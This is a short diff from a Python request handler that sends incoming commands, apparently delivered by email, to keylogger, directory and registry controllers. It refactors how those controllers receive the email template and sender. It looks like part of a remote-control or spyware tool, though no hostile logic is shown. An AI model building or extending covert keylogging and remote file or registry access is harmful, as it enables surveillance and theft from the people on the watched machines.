@@ -37,11 +37,11 @@ def HandleRequest(request, emailTemplate):
             controller = KeyloggerControl()
             return controller.KeyloggerHandle(emailTemplate, emailFrom)
         if(method == "DIRECTORY"):
-            directory = FileControl(emailTemplate, request.From)
-            return directory.FileHandle(emailTemplate)
+            controller = FileControl(emailTemplate, emailFrom)
+            return controller.FileHandle()
         if(method == "REGISTRY"):
-            controller = RegistryControl()
-            return controller.RegistryHandle(request, emailTemplate)
+            controller = RegistryControl(emailTemplate, emailFrom)
+            return controller.RegistryHandle()
     except:
         response = {
                 "isSuccess": False,
